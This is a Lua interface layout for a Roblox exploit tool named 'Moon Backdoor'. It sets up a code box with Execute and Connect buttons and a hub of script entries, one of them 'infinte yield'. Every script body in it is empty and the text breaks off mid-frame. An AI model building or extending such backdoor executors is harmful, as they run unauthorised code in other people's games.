--- getgenv().MoonBackdoor:ASync(".S_class")
















































































































































































--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 172 | Scripts: 23 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGUi);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Load
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Load]];
G2L["2"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Load.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Load.bg
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["ZIndex"] = 10000000;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["4"]["Image"] = [[rbxassetid://992001116]];
G2L["4"]["Size"] = UDim2.new(1.41, 0, 1, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 0.4;
G2L["4"]["Name"] = [[bg]];
G2L["4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.bg.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.ScreenGui.Load.Logo
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["ZIndex"] = 10000000;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Image"] = [[rbxassetid://73958241564252]];
G2L["6"]["Size"] = UDim2.new(0, 109, 0, 133);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 0.4;
G2L["6"]["Name"] = [[Logo]];
G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["8"] = Instance.new("UIAspectRatioConstraint", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UICorner
G2L["9"] = Instance.new("UICorner", G2L["6"]);
G2L["9"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["a"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Main
G2L["b"] = Instance.new("Frame", G2L["1"]);
G2L["b"]["Visible"] = false;
G2L["b"]["ZIndex"] = 1000000000;
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["b"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["b"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.UIDrag
G2L["c"] = Instance.new("LocalScript", G2L["b"]);
G2L["c"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.ScreenGui.Main.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["b"]);



-- StarterGui.ScreenGui.Main.bg
G2L["f"] = Instance.new("ImageLabel", G2L["b"]);
G2L["f"]["ZIndex"] = 1000000000;
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["f"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["f"]["Image"] = [[rbxassetid://992001116]];
G2L["f"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Name"] = [[bg]];
G2L["f"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Main.bg.UICorner
G2L["10"] = Instance.new("UICorner", G2L["f"]);
G2L["10"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.CodeBar
G2L["11"] = Instance.new("TextBox", G2L["b"]);
G2L["11"]["Name"] = [[CodeBar]];
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11"]["ZIndex"] = 1000000000;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextWrapped"] = true;
G2L["11"]["TextSize"] = 17;
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["MultiLine"] = true;
G2L["11"]["ClearTextOnFocus"] = false;
G2L["11"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["11"]["Size"] = UDim2.new(0, 506, 0, 212);
G2L["11"]["Position"] = UDim2.new(0.04237, 0, 0.14512, 0);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.CodeBar.UICorner
G2L["12"] = Instance.new("UICorner", G2L["11"]);
G2L["12"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons
G2L["13"] = Instance.new("Frame", G2L["b"]);
G2L["13"]["ZIndex"] = 1000000000;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["Size"] = UDim2.new(0, 506, 0, 43);
G2L["13"]["Position"] = UDim2.new(0.04237, 0, 0.82555, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[Buttons]];
G2L["13"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["14"] = Instance.new("UIListLayout", G2L["13"]);
G2L["14"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["14"]["Padding"] = UDim.new(0, 19);
G2L["14"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["14"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["14"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["15"] = Instance.new("TextButton", G2L["13"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 29;
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["ZIndex"] = 1000000000;
G2L["15"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[Execute]];
G2L["15"]["Name"] = [[Exe]];
G2L["15"]["Position"] = UDim2.new(0.07609, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Exe.UICorner
G2L["16"] = Instance.new("UICorner", G2L["15"]);
G2L["16"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["17"] = Instance.new("TextButton", G2L["13"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 29;
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["ZIndex"] = 1000000000;
G2L["17"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[clear]];
G2L["17"]["Name"] = [[Clear]];
G2L["17"]["Position"] = UDim2.new(0.60236, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear.UICorner
G2L["18"] = Instance.new("UICorner", G2L["17"]);
G2L["18"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Name
G2L["19"] = Instance.new("TextLabel", G2L["b"]);
G2L["19"]["ZIndex"] = 1000000000;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 36;
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[Moon Backdoor]];
G2L["19"]["Name"] = [[Name]];
G2L["19"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["1a"] = Instance.new("ImageLabel", G2L["b"]);
G2L["1a"]["ZIndex"] = 1000000000;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1a"]["Image"] = [[rbxassetid://73958241564252]];
G2L["1a"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Name"] = [[Logo]];
G2L["1a"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1b"] = Instance.new("UIAspectRatioConstraint", G2L["1a"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["1c"] = Instance.new("TextLabel", G2L["b"]);
G2L["1c"]["ZIndex"] = 1000000000;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 20;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["BackgroundTransparency"] = 1;
G2L["1c"]["Size"] = UDim2.new(0, 58, 0, 52);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[🔴]];
G2L["1c"]["Name"] = [[Stats]];
G2L["1c"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["1d"] = Instance.new("UIAspectRatioConstraint", G2L["1c"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["1e"] = Instance.new("TextButton", G2L["b"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 20;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["ZIndex"] = 1000000000;
G2L["1e"]["Size"] = UDim2.new(0.03105, 98, 0.01352, 22);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Connect]];
G2L["1e"]["Name"] = [[Connect]];
G2L["1e"]["Position"] = UDim2.new(0.69522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Connect.UICorner
G2L["1f"] = Instance.new("UICorner", G2L["1e"]);
G2L["1f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.UICorner
G2L["20"] = Instance.new("UICorner", G2L["b"]);
G2L["20"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Hub
G2L["21"] = Instance.new("TextButton", G2L["b"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 20;
G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["ZIndex"] = 1000000000;
G2L["21"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[Hub]];
G2L["21"]["Name"] = [[Hub]];
G2L["21"]["Position"] = UDim2.new(0.51522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Hub.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.ScreenGui.Main.Hub.UICorner
G2L["23"] = Instance.new("UICorner", G2L["21"]);
G2L["23"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub
G2L["24"] = Instance.new("Frame", G2L["1"]);
G2L["24"]["Visible"] = false;
G2L["24"]["ZIndex"] = 1000000000;
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["24"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["24"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Name"] = [[Hub]];


-- StarterGui.ScreenGui.Hub.UIDrag
G2L["25"] = Instance.new("LocalScript", G2L["24"]);
G2L["25"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Hub.bg
G2L["26"] = Instance.new("ImageLabel", G2L["24"]);
G2L["26"]["ZIndex"] = 1000000000;
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["26"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["26"]["Image"] = [[rbxassetid://992001116]];
G2L["26"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["BackgroundTransparency"] = 1;
G2L["26"]["Name"] = [[bg]];
G2L["26"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.bg.UICorner
G2L["27"] = Instance.new("UICorner", G2L["26"]);
G2L["27"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.Name
G2L["28"] = Instance.new("TextLabel", G2L["24"]);
G2L["28"]["ZIndex"] = 1000000000;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 36;
G2L["28"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[Moon Backdoor Hub!]];
G2L["28"]["Name"] = [[Name]];
G2L["28"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.Logo
G2L["29"] = Instance.new("ImageLabel", G2L["24"]);
G2L["29"]["ZIndex"] = 1000000000;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["29"]["Image"] = [[rbxassetid://73958241564252]];
G2L["29"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["BackgroundTransparency"] = 1;
G2L["29"]["Name"] = [[Logo]];
G2L["29"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Hub.Logo.UIAspectRatioConstraint
G2L["2a"] = Instance.new("UIAspectRatioConstraint", G2L["29"]);



-- StarterGui.ScreenGui.Hub.Hub
G2L["2b"] = Instance.new("TextButton", G2L["24"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 20;
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["ZIndex"] = 1000000000;
G2L["2b"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Exe]];
G2L["2b"]["Name"] = [[Hub]];
G2L["2b"]["Position"] = UDim2.new(0.79522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.Hub.LocalScript
G2L["2c"] = Instance.new("LocalScript", G2L["2b"]);



-- StarterGui.ScreenGui.Hub.Hub.UICorner
G2L["2d"] = Instance.new("UICorner", G2L["2b"]);
G2L["2d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame
G2L["2e"] = Instance.new("ScrollingFrame", G2L["24"]);
G2L["2e"]["Active"] = true;
G2L["2e"]["ZIndex"] = 1000000000;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["Size"] = UDim2.new(-0.01, 505, 0, 259);
G2L["2e"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Position"] = UDim2.new(0.05144, 0, 0.15854, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIPadding
G2L["2f"] = Instance.new("UIPadding", G2L["2e"]);
G2L["2f"]["PaddingTop"] = UDim.new(0, 5);
G2L["2f"]["PaddingLeft"] = UDim.new(0, 8);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIListLayout
G2L["30"] = Instance.new("UIListLayout", G2L["2e"]);
G2L["30"]["Wraps"] = true;
G2L["30"]["Padding"] = UDim.new(0, 6);
G2L["30"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["30"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["31"] = Instance.new("Frame", G2L["2e"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["31"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["32"] = Instance.new("UIStroke", G2L["31"]);
G2L["32"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["32"]["Thickness"] = 1.3;
G2L["32"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["33"] = Instance.new("ImageLabel", G2L["31"]);
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["33"]["Image"] = [[rbxassetid://114500437382056]];
G2L["33"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["34"] = Instance.new("UICorner", G2L["33"]);
G2L["34"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["35"] = Instance.new("UIGradient", G2L["33"]);
G2L["35"]["Rotation"] = 90;
G2L["35"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["36"] = Instance.new("TextButton", G2L["31"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["TextSize"] = 22;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["Text"] = [[Execute]];
G2L["36"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["38"] = Instance.new("UICorner", G2L["36"]);
G2L["38"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["39"] = Instance.new("UICorner", G2L["31"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["3a"] = Instance.new("TextLabel", G2L["31"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 32;
G2L["3a"]["TextTransparency"] = 0.49;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[Goner]];
G2L["3a"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["3b"] = Instance.new("Frame", G2L["2e"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["3b"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["3c"] = Instance.new("UIStroke", G2L["3b"]);
G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3c"]["Thickness"] = 1.3;
G2L["3c"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["3d"] = Instance.new("ImageLabel", G2L["3b"]);
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3d"]["Image"] = [[rbxassetid://72792773278885]];
G2L["3d"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["3e"] = Instance.new("UICorner", G2L["3d"]);
G2L["3e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["3f"] = Instance.new("UIGradient", G2L["3d"]);
G2L["3f"]["Rotation"] = 90;
G2L["3f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["40"] = Instance.new("TextButton", G2L["3b"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextSize"] = 22;
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[Execute]];
G2L["40"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["42"] = Instance.new("UICorner", G2L["40"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["43"] = Instance.new("UICorner", G2L["3b"]);
G2L["43"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["44"] = Instance.new("TextLabel", G2L["3b"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextSize"] = 32;
G2L["44"]["TextTransparency"] = 0.49;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["BackgroundTransparency"] = 1;
G2L["44"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[infinte yield]];
G2L["44"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["45"] = Instance.new("Frame", G2L["2e"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
